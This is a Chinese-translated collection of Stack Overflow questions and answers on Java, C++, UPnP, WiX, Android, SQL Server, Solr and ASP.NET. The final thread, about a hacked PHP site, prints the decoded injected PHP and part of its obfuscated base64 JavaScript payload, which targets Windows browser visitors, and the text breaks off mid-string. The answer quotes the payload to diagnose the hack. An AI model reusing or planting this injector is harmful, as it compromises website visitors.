当然，这仍然缺乏标题和内容的样式。（我添加`background-color`了，`.container`所以它看起来不太难看）。
我假设你在其他地方有这个？

如果您需要更多帮助，请详细说明您的问题是什么。

# java - 如何使用 SSL 证书

> ID：12392075
> 
> 赞同：0
> 
> 时间：2012-09-12T15:54:07.400
> 
> 标签：java, ssl, https, ssl-certificate

> **可能重复：**
> [如何接受带有 Java HttpsURLConnection 的自签名证书？](https://stackoverflow.com/questions/859111/how-do-i-accept-a-self-signed-certificate-with-a-java-httpsurlconnection)

我需要连接到一个网站并在请求中发送一个 xml。该网站正在使用 HTTPS 连接。该站点不提供证书的自动下载。因此，他们提供了 PEM 格式的证书。任何人都可以举一个使用证书将通过 java 连接到安全站点的示例吗？或者我需要在哪里安装此证书才能在 java 程序中使用它？

# java - 订阅、接收和发送消息的中央集线器？

> ID：12392081
> 
> 赞同：1
> 
> 时间：2012-09-12T15:54:39.317
> 
> 标签：java, swing, events

我的应用程序（Java swing）变得非常大，我现在正忙于解耦一些组件。在当前情况下，我的所有组件都引用了一个或多个其他组件，如果组件树很小，这很有效，但是当树变大时变得难以管理（大型构造函数）

是否可以让子视图发送类型为 x 的消息，该消息由注册（在中央集线器处）的视图接收到他们想要接收这种类型的消息？

当然这是可能的，我可以实现它，但感觉有点像重新发明轮子。

是否有任何库/产品可以充当中心枢纽，其中视图可以订阅消息类型以及视图也可以将消息发送到哪里？

（请注意我对此进行了搜索，但我怀疑我不知道这个中央枢纽结构/模式的正确英文单词）（所以正确的英文单词也可以；））

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T15:59:07.513

您的场景可以使用为实现 JMS 规范的消息传递系统[`Observer`](http://en.wikipedia.org/wiki/Observer_pattern)提供进程内发布-订阅范式的模式来解决。[`ActiveMQ`](http://activemq.apache.org/)

# c++ - 测试 mini Matrix ADT 时的核心转储

> ID：12392085
> 
> 赞同：1
> 
> 时间：2012-09-12T15:55:00.523
> 
> 标签：c++, templates, overloading, operator-keyword, coredump

我目前正在做一个实现模板化矩阵类的项目；但是，每当我尝试运行我的测试功能时，程序就会崩溃并转储核心。以下是我得到的输出：

```
0 0
[3 3 1 2 3 4 5 6 9 8 10]
[1 2 3 
 4 5 6
 9 8 10]
stream out sucessInvalid Input for matrix
stream in sucessError: matrix Multiplication not defined.
[1 2 3 
 4 5 6
 9 8 10]

Error: The addition of two matrices of different demensions is not defined.

Error: The addition of two matrices of different demensions is not defined.

7700640
7700576
Error: The addition of two matrices of different demensions is not defined.
*** glibc detected *** ./a.out: free(): invalid pointer: 0x00000030143b0778 ***
======= Backtrace: ========= <Continues> ... 
```

调用函数是：

```
TestingMatrix(){
matrix<int> a, b, c;
//Three empty matrices are created
cout << a.numrows() << " " << a.numcols() << endl; // yields 0 0
cin >> a; // User types [3 3 1 2 3 6 5 4 9 8 10]
// This will create a 3 by 3 matrix
cout << a;
cin >> b; //User types [3 2 9 1 2 3 4 5]
cout << b;
c=a*b;

cout << c << endl; 
cout << b+c << endl; 
matrix<int> d(5*b); // d is initialized to 5*b
cout << d << endl; 
cout << a[0][0] << endl;
//Should printout 1
cout << a[1][2] << endl;
//Should printout 4
d = a + b;
//This should cause an exception that you
//are able to handle; The sizes of a and b don’t agree.
}//End of TestingMatrix() function 
```

矩阵类如下：

```
// matrix.h
#ifndef matrix_H
#define matrix_H
#include <iostream>
#include <cstdlib>
using namespace std;
template <class mType> class matrix {
public:
    matrix() : N(0), M(0), origin(NULL) { /* EMPTY */ }
    matrix(int n, int m): N(n), M(m), origin(NULL) {
        allocate(n,m);
    }

    ~matrix() {
        clear();
    }

    matrix & operator=(const matrix &rhs) {

        if (this != &rhs) {     //Check to see they're not the same instance

            this->clear();
            this->allocate(rhs.numrows(), rhs.numcols());
            for(int i=0; i<N; ++i)
                for (int j=0; j<M; ++j)
                    this->origin[i][j] = rhs[i][j];
            }

        return *this;
    }

    matrix & operator+=(const matrix &rhs) {
        try {
            if (    this->numrows() != rhs.numrows() ||
                this->numcols() != rhs.numcols() ) 
                throw 1;
        }
        catch (int e)
        {
            cerr << "Error: The addition of two matrices of different demensions is not defined." << endl;
            return *this;
        }

        for(int i=0; i<N; ++i)
            for (int j=0; j<M; ++j)
                this->origin[i][j] += rhs[i][j];
        return *this;
    }

    const matrix operator+(const matrix &rhs) const {
       matrix tmp = *this;     // tmp copy so we can use the += operator
       return (tmp += rhs);     // return answer
    }

    const matrix operator*(const matrix &rhs) const {
        try {
            if (    this->numcols() != rhs.numrows() )
                throw 1;
        }
        catch (int e)
        {
            cerr << "Error: matrix Multiplication not defined." << endl;
            return *this;
        }
        matrix<mType> returnmatrix(this->numrows(), rhs.numcols());

        for (int i=0; i<returnmatrix.numrows(); ++i)
            for (int j=0; j<returnmatrix.numcols(); ++j)
                for (int k=0; k < this->numcols(); ++k)
                    returnmatrix[i][j] += *this[i][k] * rhs[k][j];
        return returnmatrix;

     }

    inline int const numrows() const {
        return N;
    }

    inline int const numcols() const {
        return M;
    }

    void allocate(int n, int m) {
        if (origin)
            clear();
        origin = new mType* [n];
        for (int i=0; i<n; ++i)
            origin[i] = new mType[m];
        M=m;
        N=n;        
    }
    void clear() {
        if (origin) {
            for(int i = 0; i < N; i++)
                    delete[] origin[i];
            delete origin;
        }

        M=N=0; // Reset

        origin=NULL; 
    }

    mType* operator [] (const int index)  { return origin[index]; }
    const mType* operator [] (const int index) const  { return origin[index]; }

    friend matrix<mType> operator*( mType factor, const matrix<mType> rhs ) {
        matrix<mType> out(rhs.numrows() , rhs.numcols());       
            for (int i=0; i<rhs.numrows(); ++i) {
                for (int j=0; j<rhs.numcols(); ++j) {
                    out[i][j] = rhs[i][j]*factor;
                }
            }
        return out;
    }

    friend ostream& operator<< (ostream& out, const matrix<mType>& A) {

        if (A.numrows() > 0 && 0 <  A.numcols()) {
            out <<"[";
            for (int j=0; j<A.numcols(); ++j) {
                out << A[0][j] << " ";
            }
            for (int i=1; i<A.numrows(); ++i) {
                out << endl;
                for (int j=0; j<A.numcols(); ++j) {
                    out << " " << A[i][j];
                }
            }
            out << "]" <<endl;

        }
        return out;
    }

     friend istream& operator>> (istream& in, matrix<mType> &A)  {
        //[3 2 9 1 2 3 4 5]
        //toss first char
        try {
            if (in.get() != '[')
                throw 1;
            int N, M;
            mType tmp;
            in >> N;
            in >> M;

            A = matrix<mType>(N,M);
            for (int i=0; i<N; ++i)
                for (int j = 0; j < M; j++)
                {   
                    in >> tmp;
                    A[i][j] = tmp;
                }
            in.get();
        }
        catch (int e) {
            cerr << "Invalid Input for matrix" << endl;

        }

        return in;
    }

private: 
    int N, M;
    mType ** origin;

};

#endif 
```

有谁知道如何解决这个问题？我对这个问题的来源非常迷茫。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T16:06:52.243

由于您已动态分配资源，因此您应该遵循[三规则](http://en.wikipedia.org/wiki/Rule_of_three_%28C%2B%2B_programming%29)并实现复制构造函数。目前，复制构造将使用编译器生成的复制构造函数，复制指向底层数据的指针，而不复制数据本身。

您的加法运算符中至少有一个副本结构：

```
const matrix operator+(const matrix &rhs) const {
   matrix tmp = *this; // copy!
   return (tmp += rhs); // potentially another copy
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T16:07:24.723

你没有`copy c-tor`，编译器会生成默认值，`memberwise-copy`但如果你在类中有动态分配的资源 - 你应该有自己的`copy c-tor`，那样做`deep-copy`。

# java - 坚持 UPnP 不返回操作

> ID：12392087
> 
> 赞同：2
> 
> 时间：2012-09-12T15:55:07.217
> 
> 标签：java, android, upnp

我在 android 中使用[紧贴 UPnP](http://4thline.org/projects/cling/)框架连接到启用 UPnP 的设备。我成功地创建了设备并浏览了网络中的可用设备。但对于三星电视在网络框架中没有返回任何动作。在这里，我添加了 RenderingControl 的服务细节

```
<service>
<serviceType>urn:schemas-upnp-org:service:RenderingControl:1</serviceType>
<serviceId>urn:upnp-org:serviceId:RenderingControl</serviceId>
<controlURL>/upnp/control/RenderingControl1</controlURL>
<eventSubURL>/upnp/event/RenderingControl1</eventSubURL>
<SCPDURL>RenderingControl1.xml</SCPDURL>
</service> 
```

这是获取服务描述符 xml 文件的 url

```
> http://<ip address>:52235/dmr/SamsungMRDesc.xml 
```

但是SCPDURL是相对的，我想知道紧贴框架是否正在搜索

> `http://<ip address>:52235/RenderingControl1.xml`

代替

> `http://<ip address>:52235/dmr/RenderingControl1.xml`

是因为坚持 UPnP 中的服务没有显示任何操作，还是我在做一些非常愚蠢的事情？

我怎样才能正确地使用[UPnP](http://4thline.org/projects/cling/)做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T19:24:46.600

事先澄清一下：URL`*SamsungMRDesc.xml`是一个*设备描述符*，而不是你写的*服务描述符，对吧？*

每个`<SCPDURL>`UPnP 规范是“相对于设备描述所在的 URL”。所以是的，正确的绝对 SCPDURL 是第二个。但如果 Cling 中真的存在如此严重的错误，我会感到非常惊讶。所以提供一些理论：

1.  “Cling UPnP 中没有显示任何操作”是什么意思？那是一些现有的示例应用程序还是您的代码？Cling 本身不提供任何 GUI。该代码中可能存在错误吗？
2.  您绝对确定*设备描述符*URL (SamsungMRDesc) 吗？是否可以手动访问，即只需将 URL 复制并粘贴到 Web 浏览器中？
3.  如果您将 SCPDURL 复制并粘贴到 Web 浏览器中，您会看到什么？下面有一些`<action>`节点`<actionList>`吗？
4.  您是否尝试过使用[Intel Developer Tools](http://opentools.homeip.net/dev-tools-for-upnp)中的 DeviceSpy 查询您的三星电视？除了 Cling 之外，您还可以看到其他 UPnP 堆栈看到的内容。此外，您可以右键单击设备节点以及服务节点，然后查看 DeviceSpy 查找描述的位置。
5.  最后，您可以使用 Wireshark 来嗅探来回发送的内容。首先将 Wireshark IP 过滤器设置为三星电视的地址。

理论 4 和 5 显然需要将 PC 连接到与电视（和您的 Android）相同的网络。

# c# - C# - WiX Windows 服务

> ID：12392088
> 
> 赞同：0
> 
> 时间：2012-09-12T15:55:10.783
> 
> 标签：c#, windows-services, wix

我有一个 WiX 设置项目，它获取 ac# windows 服务的输出。我安装了项目并正确创建了服务（在 services.msc 中），我可以在任务管理器中看到该过程。

我的 Windows 服务是一个绑定到 IP:PORT 并只监听连接的服务器。

当我使用 WiX 安装服务时，IP:PORT 的绑定似乎没有发生，但没有给出错误。我检查了 netstat，但在列表中没有看到 IP:PORT。

另一方面，当我使用 InstallUtil 时，它可以正常工作。

我在 WiX 中做错了什么，还是我需要在我的服务中进行更改才能使其正常工作？

使用 .NET 4.0

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T16:50:28.573

假设相同的数据集，无论您是使用[SC](http://technet.microsoft.com/en-us/library/bb490995.aspx)命令、[ServiceInstall Table](http://msdn.microsoft.com/en-us/library/windows/desktop/aa371637%28v=vs.85%29.aspx)还是 InstallUtil 启动的安装程序类自定义操作，最终状态都应该相同。

因此，要么数据集不同（用户名、密码等），要么您在 ServiceInstall 表未表示的自定义操作中完成了额外的注册代码。

如果不观察虚拟机或查看安装程序自定义操作代码，很难进一步排除故障。我可以说，这些年来我已经安装了数百个用 .NET 编写的 Windows (NT) 服务，而且 ServiceInstal 的功能更强大。

# android - Android，管理视图、任务和活动

> ID：12392090
> 
> 赞同：1
> 
> 时间：2012-09-12T15:55:17.057
> 
> 标签：android

我需要一般建议。

我正在构建一个可以通过图标启动的应用程序（正常方式），但也可以通过单击通知区域（应用程序在通知区域中放置一个图标）触发意图。当时间事件/警报发生时被唤醒。

该应用程序有 5 到 10 个视图。为每个视图打开一个新活动会更好吗？我如何确保不打开多个任务？假设我的应用程序是 Activity-A、Activity-B、Activity-C 并且可以从 Activity-A 和 Activity-B 启动（取决于它是通过图标还是通知区域打开）......我该如何清理所有内容在应用程序关闭时？

还是有一个活动并只切换视图（xml 布局）更好？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T22:04:58.777

它可能就像使用不同的启动模式一样简单，您可以在清单中定义它，或者我认为在您正在使用的 inent 中定义。这需要一些试验，但 SingleTask 或 SingleInstance 可能是您的正确选择，

在这种情况下，您的活动应支持 onNewIntent，以重用现有活动（如果这是所需的效果）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T20:38:29.917

我将从您应该观看和阅读的内容开始。应该清楚的是，Android 中的导航很容易出错。谷歌在不同的应用程序之间有着不同的历史，但它们正在变得更好。这就是说，如果你要做一个应用程序，你应该知道它是如何工作的，最好的方法是阅读文档。如前所述，[在 IO'12 上有一场精彩的演讲](http://youtu.be/XwGHJJYBs0Q)。在[设计网站](http://developer.android.com/design/patterns/navigation.html)上也有一个很好的部分，最后在[API Guides](http://developer.android.com/guide/components/tasks-and-back-stack.html)中也有一个很好的部分。

总结一下：全屏是一个活动（它又可以由片段构成）。几乎在所有情况下，活动都应该构造为树，根是从家里启动的活动。对于每个活动，您都应该有一个“向上”活动，它将您带入层次结构。请注意，这与返回不同，返回应该将您带到您所处的最后一个全屏状态。另请注意，全屏意味着例如选项卡不应记录在“返回历史记录”中，因为它们提供屏幕内的导航。

当点击通知时，它应该相当于：按主页，从最近视图中删除任务（清除任务），打开任务，最后采取最短路径到达显示通知信息的活动告诉过你。很复杂，确实是的......但至少在 JB 和支持库中有一个帮助程序类，称为 TaskStackBuilder。

这一切的关键是遵循 Android 设计准则的 UI 设计。花点时间为您的应用程序进行设计，并确保分开（静态）和返回（临时）。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-09-12T16:32:52.530

在这种情况下，我最好使用一项活动或使用片段。

# schema.org - Rich Snippet 未显示在 Google 搜索结果页面中

> ID：12392091
> 
> 赞同：4
> 
> 时间：2012-09-12T15:55:25.530
> 
> 标签：schema.org, rich-snippets, google-rich-snippets

大约一个月前，我们在电子商务网站的产品详细信息页面上实施了 Rich Snippets（[示例](http://www.superherostuff.com/batman/t-shirts/batman-traditional-symbol-t-shirt.html?itemcd=tsbatsymbol)）。

我们对结构化数据使用了[http://schema.org/](http://schema.org/)语法，因为这似乎是 Google 前进的路线。

[Rich Snippet Testing Tool 中的数据似乎是正确的，](http://www.google.com/webmasters/tools/richsnippets?url=http%3A%2F%2Fwww.superherostuff.com%2Fbatman%2Ft-shirts%2Fbatman-traditional-symbol-t-shirt.html%3Fitemcd%3Dtsbatsymbol)并且数据已开始出现在 Google Webmaster Tools 中。

然而，数据仍有待在 SERP 上看到。

我们已经严格按照 Google 上的丰富数据指南进行操作，但仍然没有结果。这是只是等待的情况吗？

这里还有一条更令人费解的信息，我们最初采用了微格式实施，并在 24 小时内开始在 SERP 上显示数据。然而，我们放弃了这一点，因为 Schema.org 方法似乎是一个更好的选择。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-13T14:30:55.503

我想这是我在 Wiki 帖子中解释的原因之一

[http://wiki.goodrelations-vocabulary.org/FFAQ#Why_is_Google_not_showing_rich_snippets_for_my_pages.3F](http://wiki.goodrelations-vocabulary.org/FFAQ#Why_is_Google_not_showing_rich_snippets_for_my_pages.3F)

虽然那个指的是 GoodRelations 标记，但 schema.org 的情况应该是一样的。

马丁

引用：

如果您已将 GoodRelations（手动或通过商店扩展模块）添​​加到您的商店，但仍未在 Google 搜索结果中获得丰富网页摘要，则可能是以下原因之一：

1.  **Google 尚未重新抓取您的一个或多个页面。**谷歌只为一个网站分配有限的抓取时间，这取决于它的全球相关性。可能是谷歌还没有重新索引你的页面。等待 2 - 8 周 ;-)
2.  **标记无效。**试试谷歌验证器。如果在预览中显示丰富的网页摘要，您可能只需要等待 4 到 12 周，直到 Google 注意到您的网页并将其列入白名单。如果它没有显示丰富的摘要，您要么在页面中没有有效的 GoodRelations 标记，要么您缺少 Google 要求的属性（例如 gr:validThrough 用于价格），商品的价格已过期，或者您使用标记谷歌不显示丰富网页摘要。目前，Google 仅显示产品和优惠的摘要。
3.  **Google 看不到您的页面已更改。**您的 XML 站点地图（http://example.com/sitemap.xml 或类似网站）不包含 lastmod 属性，或者在您添加 GoodRelations/schema.org 后 lastmod 属性未更新。这个属性对于爬虫来说很重要，它可以注意到哪些页面需要重新索引。
4.  **您的商品页面排名较低。**您的商品页面排名较低，您在 Google 搜索结果中看到的是类别页面或其他汇总多个商品的页面。GoodRelations 商店扩展仅将标记添加到“深层”商品页面，因为这些页面最适合丰富网页摘要。使用您的一种产品的标题/产品名称，并通过附加声明 site:www.example.com 将 Google 搜索限制在您的网站上。

# sql - sql server全文搜索未返回正确结果

> ID：12392092
> 
> 赞同：0
> 
> 时间：2012-09-12T15:55:31.750
> 
> 标签：sql, sql-server, full-text-search

我在 all_metadata 行的下表中定义了全文目录：

```
ft_id   record_id   am_changestamp  all_metadata          
21  42  2012-09-11 17:07:25.553  Photos Project 1234 5678 |Mockups|pictures|Abbot| testing Revenue migration testing Getty Images Abbot g  test.txt                                                        

22  43  2012-09-11 17:11:06.147  Photos Project 1234 5678 |Mockups|pictures|Abbot| testing Revenue migration testing Getty Images Abbot g  test1.txt 
```

我正在运行的 SQL 是：

```
select f0.record_id from ft_all_metadata as f0, 
containstable(ft_all_metadata, all_metadata, N'Images') as kt where f0.ft_id = kt.[key] 
```

SQL 返回第一行但不返回第二行！！！！我真的很困惑！

我尝试重新创建和重新构建全文目录，但没有成功。

感谢您的帮助，布鲁斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-19T15:43:07.210

我曾依靠 SQL Server Manager GUI 来执行此操作，但一定是做错了什么。

因此决定通过命令执行此操作，现在可以使用：

exec sp_fulltext_catalog 'Catalogu_Name', 'create'

exec sp_fulltext_table 'table_name'、'create'、'Catalogu_Name'、'table_index_name'

exec sp_fulltext_column 'table_name'、'column_name'、'add'

exec sp_fulltext_table 'table_name', '激活'

exec sp_fulltext_catalog 'Catalogu_Name', 'start_full'

我在主键上为 table_index_name 创建了一个单独的索引。

# solr - 在 Solr 的分布式分组中计算不同的组

> ID：12392096
> 
> 赞同：0
> 
> 时间：2012-09-12T15:55:46.883
> 
> 标签：solr, grouping, distribute, fieldcollapsing

有没有办法在 solr 中获取分布式分组中不同组的数量？

ngroups 参数返回所有组的总和。如果一个组存在于多个分片中，我将在 ngroups 中重复这些组。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-13T14:19:21.103

检查[SOLR-3316](https://issues.apache.org/jira/browse/SOLR-3316)和[SOLR-3436](https://issues.apache.org/jira/browse/SOLR-3436)。
可能是已修复的现有问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-06-12T20:18:17.267

现在有几个解决方案：

[http://yonik.com/solr-count-distinct/](http://yonik.com/solr-count-distinct/)

您可以将 stats 组件与 pivot faceting 一起使用，将 group 与 group.facet 一起使用，或者使用 5.2 中提供的新分析 API（5.1。当我尝试它时似乎不起作用）。

# asp.net - 在 aspx 中调试

> ID：12392103
> 
> 赞同：0
> 
> 时间：2012-09-12T15:56:01.703
> 
> 标签：asp.net, debugging

我正在尝试在 aspx 页面的文件后面的代码中调试一些代码。我在页面和 web.config 中都将调试设置为 true。

有人可以告诉我为什么a）即使下拉列表已填充，断点也不会触发，b）为什么当我取消注释msgbox时它永远不会触发并且下拉列表不会填充。

```
Protected Sub Page_Load(sender As Object, e As EventArgs) Handles Me.Load

    If IsPostBack Then
        ddlCity.Items.Clear()
        Dim context As New enerteckEntities()

        'Dim query = context.DistinctCityFromZiptax(Convert.ToInt16(ddlState.SelectedValue))
        Dim query = From c In context.ziptaxes Where c.StateID = ddlState.SelectedValue Order By c.City Select c.City, c.ZipTaxId
        'MsgBox(query.Distinct().ToList())

        ddlCity.DataSource = query.Distinct().ToList()
        ddlCity.DataValueField = "ziptaxid"
        ddlCity.DataTextField = "City"
        ddlCity.DataBind()
    End If
End Sub 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T15:59:38.520

要达到断点，Visual Studio 必须附加到托管 aspx 页面的进程。

这通常在 Web 应用程序项目中通过按 F5 键或单击“调试”菜单并单击“开始调试”来完成。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T16:07:58.297

那么根据您的代码，您只会在 PostBack 之后执行此操作，而不是在初始页面加载时执行。

MsgBox 永远不会出现，因为这不是 WinForms 应用程序！您不能在 web.application 中使用它。如果你愿意，你可以使用 Response.Write() 或者只是在页面中添加一个虚拟标签并临时设置 text 属性。这是相同的效果。

最简单的就是调试它。确保您的断点是完整的红点，并且您必须处于调试模式。如果您尝试从 IIS 进行调试，则必须附加到进程。如果您使用的是 IIS7（我假设您是），那么您必须转到：调试菜单 > 附加到进程 > 找到名为“w3wp.exe”的进程并双击它。你现在附身了。

如果你的断点在开始调试后不是完整的红点，那么你的编译代码和你的调试文件不匹配。进行重建而不是构建。除此之外，您可能会遇到一个奇怪的问题，您可以尝试删除您的 obj 和 bin 文件夹（确保首先保存任何第三方 dll）。

# java - Java：将类路径添加到 CustomClassLoader

> ID：12392106
> 
> 赞同：3
> 
> 时间：2012-09-12T15:56:17.383
> 
> 标签：java, class, import, classpath

我有以下 CustomClassLoader

```
 /*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package Java;

/**
 *
 * @author noconnor
 */
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.security.AccessControlContext;
import java.security.AccessController;
import java.security.PrivilegedExceptionAction;
import org.apache.commons.io.FilenameUtils;

public class CustomClassLoader extends ClassLoader {

    private static String repoLocation = "C:/TempBINfolder/bin/";

    public CustomClassLoader() {
    }

    public CustomClassLoader(ClassLoader parent) {
        super(parent);
    }

    @Override
    protected Class<?> findClass(final String name)
            throws ClassNotFoundException {

        AccessControlContext acc = AccessController.getContext();

        try {
            return (Class) AccessController.doPrivileged(
                    new PrivilegedExceptionAction() {

                        public Object run() throws ClassNotFoundException {

                            FileInputStream fi = null;
                            try {

                                String fileName = FilenameUtils.getBaseName(name);
                                String path = FilenameUtils.getFullPath(name);
                                setRepoLocation(path);
                                fi = new FileInputStream(getRepoLocation() + fileName + ".class");

                                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                                byte[] buffer = new byte[8192];
                                int read;
                                while ((read = fi.read(buffer)) > 0) {
                                    baos.write(buffer, 0, read);
                                }
                                byte[] classBytes = baos.toByteArray();

                                return defineClass(fileName, classBytes, 0,
                                        classBytes.length);
                            } catch (Exception e) {
                                throw new ClassNotFoundException(name);
                            }
                        }
                    }, acc);
        } catch (java.security.PrivilegedActionException pae) {
            return super.findClass(name);
        }
    }

    public String getRepoLocation() {
        return repoLocation;
    }

    public void setRepoLocation(String repoLocation) {
        this.repoLocation = repoLocation;
    }
} 
```

它适用于大多数课程，我遇到了一个问题。我有以下java类

```
 public class IntegerComparator 
             implements Comparator<Integer>
{
   public IntegerComparator(){}

   public int compare(Integer a, Integer b)
   {  int aValue = a.intValue();
      int bValue = b.intValue();
      return (aValue - bValue);
   }  
} 
```

这个类实现了一个自定义的比较器，它与这个类位于同一个项目中，但它不会被类加载器拾取并从加载类中弹出。它没有给出任何错误，但是如果我将以下行添加到类中

```
import java.util.Comparator; 
```

CustomClassLoader 有效。这让我相信我缺少文件的类路径或类似的东西。有谁知道如何解决这个问题？

**编辑：**这是调用类加载器的代码

```
Class stringClass = null;

        for (String file : classFiles) {
            ClassLoader cls = new CustomClassLoader(ClassLoader.getSystemClassLoader());
            try {
                stringClass = cls.loadClass(file);
                tempList.add(stringClass);
            } catch (ClassNotFoundException ex) {
                Logger.getLogger(CompilerForm.class.getName()).log(Level.SEVERE, null, ex);
            }
        } 
```

如果有多个文件，我希望它循环加载多个文件

**编辑：-**详细输出

```
[Loaded java.net.MalformedURLException from C:\Program Files\Java\jdk1.7.0_05\jre\lib\rt.jar]
[Loaded Java.CustomClassLoader$1 from file:/C:/projects/Compiler/Compiler/build/classes/]
[Loaded java.lang.ClassFormatError from C:\Program Files\Java\jdk1.7.0_05\jre\lib\rt.jar]
[Loaded org.junit.runners.model.MultipleFailureException from file:/C:/projects/Compiler/Compiler/Jar%20Files/junit-4.11-SNAPSHOT-20120416-1530.jar]
[Loaded org.junit.runner.notification.Failure from file:/C:/projects/Compiler/Compiler/Jar%20Files/junit-4.11-SNAPSHOT-20120416-1530.jar]
[Loaded java.io.StringWriter from C:\Program Files\Java\jdk1.7.0_05\jre\lib\rt.jar]
[Loaded org.junit.runner.notification.RunNotifier$4 from file:/C:/projects/Compiler/Compiler/Jar%20Files/junit-4.11-SNAPSHOT-20120416-1530.jar]
[Loaded org.junit.runner.notification.RunNotifier$7 from file:/C:/projects/Compiler/Compiler/Jar%20Files/junit-4.11-SNAPSHOT-20120416-1530.jar]
[Loaded org.junit.runner.notification.RunNotifier$2 from file:/C:/projects/Compiler/Compiler/Jar%20Files/junit-4.11-SNAPSHOT-20120416-1530.jar] 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T18:02:36.427

如果`-verbose`在运行时将其作为参数添加到 JVM 会怎样。您将看到类加载详细信息。

# php - Can window.location="/";

> ID：12392107
> 
> 赞同：-5
> 
> 时间：2012-09-12T15:56:19.817
> 
> 标签：php, javascript, security, base64, eval

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T16:01:54.740

问题是您的 PHP 代码本身被黑了。您可以尝试对所有文本进行 base64 解码以查看它在做什么，但是某人或某物有权修改您的 PHP 文件。javascript与它无关。

如果你正在运行类似 wordpress 的东西，你可以看到[他们推荐](http://codex.wordpress.org/FAQ_My_site_was_hacked)的内容。不过，首先，您需要更改所有密码。然后看看有人是如何修改你的代码的。并确保您的文件不可写（例如，[尝试 755 而不是 777](http://drupal.org/node/39887)）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T16:11:14.260

您的页面中似乎有一个 html (php) 块。可能是[XSS](https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29)的结果？

**第一阶段解码显示：**

```
$ip=$_SERVER["REMOTE_ADDR"];$dr=$_SERVER["DOCUMENT_ROOT"];$ua = $_SERVER['HTTP_USER_AGENT'];$dbf=$dr.'/'.md5($dr.'1');
if((strpos($ua,'Windows')!==false)&&((strpos($ua,'MSIE')!==false)||(strpos($ua,'Firefox')!==false))&&(strpos(@file_get_contents($dbf),$ip) === false)){
    error_reporting(0);
    echo(base64_decode('PHNjcmlwdD50cnl7YWJyZSsrfWNhdGNoKGE2YmEzNHkpe3RyeXtwcm90b3R5cGUmMn1jYXRjaChhc2FiKXtlPXdpbmRvd1siZSIrInYiKyJhbCJdO319IGlmKDEpe2Y9Wy00LC01LDkwLDg5LDE4LDI1LDg3LDk3LDg0LDEwNCw5NSw4Niw5NywxMDIsMzEsOTAsODcsMTAxLDU2LDk0LDg2LDk2LDg3LDk1LDEwMywxMDEsNTEsMTA4LDcwLDgyLDkwLDY0LDgyLDk2LDg3LDI1LDI2LDg0LDk2LDg3LDEwNywyNCwyOCw3NywzMyw4MCwyNywxMDgsMCwtNSwtNiwtNCw5MSw4NywxMDEsODMsOTQsODgsMTAwLDI1LDI4LDQ1LC0yLC00LC01LDExMCwxOSw4Nyw5MywxMDIsODcsMTcsMTEwLC0xLC02LC00LC01LDg1LDk4LDg1LDEwMiw5Niw4Nyw5NSwxMDMsMzIsMTA0LDEwMSw5MSwxMDEsODgsMjYsMTksNDcsOTEsODcsMTAxLDgzLDk0LDg4LDE4LDEwMCwxMDEsODUsNDYsMjYsOTAsMTAxLDEwMyw5OCw0MywzNCwzMywxMDIsOTIsMTA3LDEwNyw5NCw5Miw5OSwzMyw4NywxMDcsMTA0LDgzLDMxLDg2LDk3LDk0LDM0LDEwNCw4NCwzMyw5OCw4OSw5OSw0OSw4OCw5OCw0NywzNSwyNiwxOCwxMDQsOTIsODYsMTAxLDkxLDQ3LDI0LDM2LDM0LDI0LDE5LDkwLDg2LDkyLDg5LDg5LDEwMyw0NywyNCwzNiwzNCwyNCwxOSwxMDEsMTAxLDEwOCw5NCw4Niw0OCwyNSwxMDMsOTIsMTAxLDkwLDg1LDkxLDkzLDkyLDEwMiwxMDYsNDUsOTAsOTAsODcsODYsODYsOTcsNDUsOTcsOTgsMTAxLDkwLDEwMyw5MSw5Niw5Nyw0NCw4Miw4NSwxMDEsOTYsOTUsMTAzLDEwMSw4OCw0NSw5Myw4OCw4OCwxMDEsNDUsMzQsNDQsMTAzLDk3LDk3LDQ1LDM0LDQ0LDI2LDQ4LDQ1LDM0LDkxLDg3LDEwMSw4Myw5NCw4OCw0OCwxOSwyOCw0NSwtMiwtNCwtNSwxMTAsMCwtNSwtNiw4OSwxMDMsOTUsODYsMTAyLDkwLDk4LDk2LDE3LDkyLDg4LDk5LDg0LDk1LDg2LDEwMSwyNiwyNiwxMTAsLTEsLTYsLTQsLTUsMTAzLDg0LDEwMCwxNyw4OSwxOCw0NiwxOSw4Niw5Niw4NiwxMDMsOTQsODgsOTYsMTAxLDMzLDg1LDk5LDg4LDgzLDEwMSw4OCw1NSw5Myw4OCw5NSw4Niw5NywxMDIsMjUsMjYsOTEsODcsMTAxLDgzLDk0LDg4LDI1LDI2LDQ2LDg4LDMxLDEwMiw4NywxMDEsNTIsMTAyLDEwMSwxMDEsOTEsODMsMTA0LDEwMiw4NiwyNywyNSwxMDAsMTAxLDg1LDI0LDMxLDI1LDg5LDEwMywxMDIsOTcsNDUsMzMsMzIsMTA0LDkxLDEwNiwxMDksOTMsOTEsMTAxLDMyLDg2LDEwOSwxMDMsODIsMzMsODUsOTYsOTYsMzMsMTAzLDg2LDMyLDk3LDkxLDk4LDQ4LDkwLDk3LDQ2LDM3LDI1LDI2LDQ2LDg4LDMxLDEwMiwxMDIsMTA2LDk1LDg3LDMxLDEwNSw5MSwxMDAsOTIsODQsOTAsOTUsOTEsMTAxLDEwOCw0NywyNCw5MSw5MSw4NSw4Nyw4